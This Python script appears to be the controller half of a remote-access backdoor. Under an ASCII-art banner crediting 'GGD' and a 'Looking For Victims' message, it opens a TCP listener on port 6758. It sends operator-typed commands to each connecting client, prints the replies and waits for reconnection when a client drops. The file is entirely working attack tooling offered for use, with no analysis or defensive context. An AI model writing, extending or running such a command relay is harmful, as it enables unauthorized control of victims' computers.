import socket


print ("""
    ██╗░░░░░░█████╗░███████╗███████╗███████╗██████╗
    ██║░░░░░██╔══██╗██╔════╝██╔════╝██╔════╝██╔══██╗
    ██║░░░░░███████║█████╗░░█████╗░░█████╗░░██████╔╝
    ██║░░░░░██╔══██║██╔══╝░░██╔══╝░░██╔══╝░░██╔══██╗
    ███████╗██║░░██║██║░░░░░██║░░░░░███████╗██║░░██║
    ╚══════╝╚═╝░░╚═╝╚═╝░░░░░╚═╝░░░░░╚══════╝╚═╝░░╚═╝


          .sd$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$;             
        .d$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$             
      .d$$$$$$$$$$P*"'   `"*T$$$$$$$$$$$$$$$             
     s$$$$$$$$$P*             `*T$$$$$$$$$$$             
    d$$$$$$$$P'                  `*T$$$$$$$P             
   d$$$$$$$P'                       `T$$$$P              
  d$$$$$$P'                           `T$P \             
 d$$$$$P'                                   \            
.$$$$$'                 .*"*                 .           
:$$$$;                  .*"*-.                           
$$$$$'                 /                      `          
$$$$$.                  .s$$s.    `*.         :          
$$$$$;                 d$$$$$$b      ;     .s$s.         
$$$$$$b.              d$$$$$$$$b     ;    d$$$$$b        
$$$$$$$$$bs._        d$$$$P^^T$$b   /    d$P***T$b       
$$$$$$$$$$$$$$bs+=- .$$P**    `TP       dP     .`T       
$$$$$$$$$$$$$$$$P'  :P'    __          /                 
$$$$$$$$$$$$$$$P    $    .'  `.       /`-.    .          
T$$$$$$$$$$$$$$     :   /      \     .    `.             
 T$$$$$$$$$$$$$        :        ;           \.           
  T*'   `*^$$$$        |+*"$P*sss*"  :*"$P*ss*"          
 /         `T$$        |   Tbd$P     :  Tbd$P            
;  ._        T$        |    T$$P     :   T$P      _._    
     `"*+.    T       *"**--._/       \   /`. .-*"   `*. 
     .*'  `.                  `*       `*---*'          ;
    (                              `.                   |
                   .'                \                  ;
\           /     /`*+...___          `-.             .* 
 `-._   _.+'          `*. __""*****------`*-.____.+*"'   
     "*"   \             `. ""*****------**"/;           
            `.         \   `--..._______...'/            
              `*--..___.`.                 /             
                          `*-...______..-*'


by GGD """)
print('')
print ('Looking For Victims')
class Server:
    def __init__(self):
        self.host = ''
        self.port = 6758
        self.server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    def bind(self):
        self.server.bind((self.host,self.port))
        self.server.listen(5)

    def accept(self):
        client, addr = self.server.accept()
        self.client = client
        self.addr = addr
        print ('Connection Established With Client Number: ',self.addr )

    def send(self,data):
        self.client.send(data.encode('UTF-8'))

    def recv(self):
        self.msg = self.client.recv(10240).decode('UTF-8')
        return self.msg

serv = Server()
serv.bind()
serv.accept()
run = True
while run:
    try:
        client_response = serv.recv()
        data = input(client_response)

        serv.send(data)

        print(serv.recv())
    except ConnectionResetError:
        print('Client lost server connection')
        print('Trying to connect . . .')
        serv.accept() 

